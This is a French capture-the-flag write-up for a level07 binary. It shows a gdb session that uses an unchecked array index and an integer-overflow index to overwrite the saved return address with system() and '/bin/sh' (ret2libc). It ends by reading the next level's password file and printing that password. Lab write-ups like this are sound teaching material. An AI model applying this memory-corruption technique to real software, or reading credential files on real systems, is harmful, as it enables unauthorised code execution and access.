Il nous est possible de stocker des nombres et de les lire à travers ce programme dans un tableau de 100 chiffres mais dont l'index n'est pas vérifié.
Cela nous permettra de manipuler la mémoire.

La condition "nb % 3 == 0" nous limite juste dans le fait que les index divisibles par 3 ne sont pas utilisables

Notre but est donc de réécrire l'adresse, de remplacer l'EIP par l'adresse de la fonction system("/bin/sh")
Mais pour cela, nous devons déjà retrouver l'EIP.

Pour se faire:

~ gdb level07
(gdb) disas main
(gdb) b *0x0804892b (adresse de l'appel la fonction read_number dans main)
(gdb) r
Input command: read
(gdb) info frame
(gdb) p/d 0xffffd72c (adresse d'eip dans la frame)
$1 = 4294956844
(gdb) info registers
eax            0xffffd534	-10956
(gdb) p/d 0xffffd564 (adresse d'eax dans les registres)
$2 = 4294956388
On peut calculer alors son index à partir du calcul suivant:
4294956844 - 4294956388 = 456
456 / 4 = 114

(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) p/a 4158936339
$3 = 0xf7e45513 <__libc_start_main+243>

On a donc un EIP de 114 divisble par 3, ce qui pose problème, car cette condition empêche de continuer dans le programme.
On peut tenter tout simplement un overflow d'int pour arriver à lire notre index 114.

4294967296 / 4 = 1073741938

(gdb) r
Input command: store
Number: 1
Index: 1073741938
Input command: read
 0xf7e6aed0
(gdb) info frame
 saved eip 0x1
(gdb) p/d 0x1 (on observe notre chiffre stocké)
(gdb) p system (on cherche l'adresse de system)
$6 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d  0xf7e6aed0 (on affiche en décimal l'adresse de system obtenue)
4159090384
(gdb) find __libc_start_main,+10000000,"/bin/sh" (On va chercher la mention /bin/sh)
0xf7f897ec
(gdb) p/d 0xf7f897ec
4160264172
(gdb) quit

Input command: store
 Number: 1
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1
 Completed read command successfully
Input command: store
 Number: 4159090384 (adresse de system)
 Index: 1073741938 (index de 114 par overflow)
 Completed store command successfully
Input command: store
 Number: 4160264172 (adresse de /bin/sh)
 Index: 116
 Completed store command successfully
Input command: quit

whoami
cat /home/users/level08/.pass

7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC